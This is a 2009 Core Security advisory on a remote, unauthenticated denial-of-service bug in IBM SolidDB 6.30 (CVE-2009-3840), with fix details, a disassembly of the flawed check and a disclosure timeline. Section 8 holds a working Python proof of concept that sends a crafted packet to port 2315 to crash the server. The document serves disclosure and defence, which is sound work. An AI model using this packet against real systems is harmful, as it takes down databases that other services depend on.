@@ -1,0 +1,108 @@
+1. Advisory Information
+
+Title: IBM SolidDB invalid error code vulnerability
+Advisory Id: CORE-2009-1027
+Advisory URL: http://www.coresecurity.com/content/ibm-soliddb-errorcode-dos
+Date published: 2009-11-18
+Date of last update: 2009-11-18
+Vendors contacted: IBM
+Release mode: Forced release
+2. Vulnerability Information
+
+Class: External Initialization of Trusted Variables [CWE-454]
+Impact: Denial of Service
+Remotely Exploitable: Yes
+Locally Exploitable: No
+Bugtraq ID: N/A
+CVE Name: CVE-2009-3840
+3. Vulnerability Description
+
+SolidDB is an in-memory relational database from IBM with over 3,000,000 deployments [1]. It is used as an embedded database by independent software vendors of enterprise applications, telecommunications and embedded software and systems. IBM reports SolidDB as being used in mission-critical applications from Cisco, HP, Alcatel and Nokia Siemens. The in-memory database is also used as core component of IBM SolidDB Universal Cache, a performance improvement application for relational databases such as DB2, Microsoft SQL Server, Oracle and Informix.
+
+A remotely exploitable vulnerability was found in the database server core component. Exploitation of this bug does not require authentication and will lead to a remotely triggered denial of service of the database service. It is not likely that this bug could be otherwise exploited to compromise systems running vulnerable versions of SolidDB. Core's security advisory CORE-2009-0814 refers to this vulnerability in HP OpenView Network Node Manager [2]
+4. Vulnerable packages
+
+    * IBM SolidDB Server 6.30.0.29
+    * IBM SolidDB Server 6.30.0.33
+    * Other versions may be vulnerable but were not tested by Core.
+
+5. Non-vulnerable packages
+
+    * IBM SolidDB Server 6.30.0.37
+
+6. Vendor Information, Solutions and Workarounds
+
+IBM has issued the SolidDB and SolidDB Universal Cache 6.3 Fix Pack 3 which addresses this problem. It is available for download from the vendor's Fix Central site:
+
+http://www-01.ibm.com/support/docview.wss?rs=0&;q1=solidb&uid=swg24024510
+
+Blocking or restricting network access to port 2315/tcp will prevent exploitation of the bug but it may have a negative impact for the operation of any application embedding or using the SolidDB engine.
+7. Credits
+
+This vulnerability was discovered and researched by Damián Frizza from Core Security Technologies.
+8. Technical Description / Proof of Concept Code
+
+IBM SolidDB server listens and accepts remote connections on port 2315/tcp. The service is implemented by solid.exe which is started automatically on boot. For certain transactions, upon receiving a packet from the network the service will attempt to determine and display an error code string based on an error code number specified in the packet. By sending a specially crafted packet with an invalid error code number it is possible to trigger an exception that forces abnormal termination of the service. It is unlikely that the bug could be exploited for anything other than a remote denial of service.
+
+The following code excerpt explains the problem:
+0061611F   0FB65424 02      MOVZX EDX,BYTE PTR SS:[ESP+2]
+00616124   0FBF4C24 03      MOVSX ECX,WORD PTR SS:[ESP+3]
+00616129   83F9 FF          CMP ECX,-1
+0061612C   0FBF4424 05      MOVSX EAX,WORD PTR SS:[ESP+5]
+00616131   8956 10          MOV DWORD PTR DS:[ESI+10],EDX
+00616134   8B5424 07        MOV EDX,DWORD PTR SS:[ESP+7]
+00616138   894E 14          MOV DWORD PTR DS:[ESI+14],ECX
+0061613B   8946 18          MOV DWORD PTR DS:[ESI+18],EAX
+0061613E   8956 0C          MOV DWORD PTR DS:[ESI+C],EDX
+00616141   7D 09            JGE SHORT solid.0061614C
+00616143   83F8 FF          CMP EAX,-1
+00616146   7D 04            JGE SHORT solid.0061614C
+00616148   3BC8             CMP ECX,EAX
+0061614A   74 05            JE SHORT solid.00616151
+0061614C   B8 01000000      MOV EAX,1
+00616151   83C4 0C          ADD ESP,0C
+00616154   C3               RETN
+
+
+
+
+The code above checks for an error condition based on the value of an Error Code field in the inbound network packet. An error condition is explicitly handled if the Error Code value is less than or equal to -1, in which case a MessageBox with a corresponding descriptive error string will be presented to the user. However, by crafting a packet with any negative value in the Error Code field different from -1 the lookup for the corresponding error string will fail triggering a non-recoverable error and thus terminating the server process.
+
+The following python code can be used to reproduce the bug:
+
+#!python
+import socket
+import struct
+
+#maxlen 0xA
+a =  struct.pack('<b', 2)
+a += struct.pack('<H', 0)
+a += struct.pack('<H',0xFEFF)
+a += struct.pack('<H',0xFEFF)
+a += "1234"
+
+target_ip = 'X.X.X.X'
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+s.connect ((target_ip, 2315))
+
+s.send(a)
+s.close()
+
+
+9. Report Timeline
+
+    * 2009-10-23: Core Security Technologies sends an email to IBM AIX Security team requesting a security point of contact to report security bugs in SolidDB and asks whether the report should be sent to SolidDB security instead.
+    * 2009-10-27: IBM AIX Security replies indicating that they forwarded the request to SolidDB's development team.
+    * 2009-10-27: SolidDB's QA Manager contacts Core acknowledging the request originally sent to AIX Security and indicating that although there isn't an established formal channel to report security bugs in SolidDB the report could be sent directly to him.
+    * 2009-10-27: Core Security Technologies replies stating that a draft technical document describing the problem is being prepared and will be sent to SolidDB as soon as it is available. In the meantime, Core indicates that a third-party vendor may have already reported the problem and requests confirmation that said vendor recently reported a remote denial of service vulnerability in the database service.
+    * 2009-11-10: Core sends the advisory with full technical details to SolidDB team and informs that its publication is set to December 7th, 2009, and that the date is subject to be changed if publication of patches is coordinated at agreed upon date between Core and IBM SolidDB. Core requests confirmation that a SolidDB OEM customer [2] has already reported the bug and received patches.
+    * 2009-11-17: IBM SolidDB publishes patches to the vulnerable products.
+    * 2009-11-18: Advisory CORE-2009-1027 published. 
+
+10. References
+
+[1] IBM SolidDB
+http://www-01.ibm.com/software/data/soliddb/
+[2] HP Openview NNM 7.53 Invalid DB Error Code vulnerability
+http://www.coresecurity.com/content/openview_nnm_internaldb_dos
